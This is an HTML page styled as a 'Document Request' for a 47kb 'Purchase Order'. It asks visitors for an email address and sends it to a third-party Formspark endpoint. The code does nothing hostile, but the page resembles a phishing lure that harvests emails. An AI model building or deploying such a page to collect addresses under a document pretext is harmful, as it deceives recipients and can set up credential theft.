
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document Request</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background: #eee url("order3.jpg") center/cover fixed;
    }

    .card {
      width: 450px;
      max-width: 100%;
      background: rgba(255,255,255,.97);
      border-radius: 10px;
      padding: 30px 24px;
      box-shadow: 0 10px 30px rgba(0,0,0,.15);
    }

    .pdf-icon {
      text-align: center;
      color: #d32f2f;
      font-size: 48px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 21px;
      text-align: center;
      margin-bottom: 10px;
    }

    .lead {
      text-align: center;
      color: #666;
      font-size: 14px;
      margin-bottom: 22px;
    }

    .input {
      width: 100%;
      padding: 14px;
      margin-bottom: 14px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 15px;
    }

    .btn {
      width: 100%;
      padding: 14px;
      background: #d32f2f;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }

    .btn:disabled {
      opacity: .6;
      cursor: not-allowed;
    }

    .message {
      margin-top: 15px;
      text-align: center;
      font-size: 14px;
    }

    .success {
      color: #16833b;
    }

    .error {
      color: #d32f2f;
    }

    .file-info {
      border-top: 1px solid #eee;
      margin-top: 22px;
      padding-top: 18px;
      color: #555;
      font-size: 14px;
    }
  </style>
</head>

<body>

  <main class="card">

    <div class="pdf-icon">📄</div>

    <h1>Document Request</h1>

    <p class="lead">
      Enter your email address to request access to the purchase order.
    </p>

    <form id="mainForm">

      <input
        class="input"
        type="email"
        id="email"
        name="email"
        placeholder="Email address"
        autocomplete="email"
        required
      >

      <input
        type="hidden"
        name="document"
        value="Purchase Order"
      >

      <button class="btn" id="submitBtn" type="submit">
        SUBMIT REQUEST
      </button>

      <div
        id="message"
        class="message"
        role="status"
        aria-live="polite"
      ></div>

    </form>

    <div class="file-info">
      <strong>Document Information</strong>
      <p>Purchase Order</p>
      <p>File Size: 47kb</p>
    </div>

  </main>

  <script>
    const FORMSPARK_URL =
      "https://submit-form.com/oEIGIOiW5";

    const form = document.getElementById("mainForm");
    const submitBtn = document.getElementById("submitBtn");
    const message = document.getElementById("message");

    form.addEventListener("submit", async function(e) {
      e.preventDefault();

      if (!form.reportValidity()) return;

      submitBtn.disabled = true;
      submitBtn.textContent = "SUBMITTING...";
      message.textContent = "";
      message.className = "message";

      const formData = new FormData(form);

      try {
        const response = await fetch(FORMSPARK_URL, {
          method: "POST",
          headers: {
            "Accept": "application/json"
          },
          body: formData
        });

        if (!response.ok) {
          throw new Error("HTTP " + response.status);
        }

        message.textContent =
          "Your request was submitted successfully.";

        message.classList.add("success");
        form.reset();

      } catch (error) {
        console.error("FormSpark error:", error);

        message.textContent =
          "Submission failed. Please try again.";

        message.classList.add("error");

      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "SUBMIT REQUEST";
      }
    });
  </script>

</body>
</html>
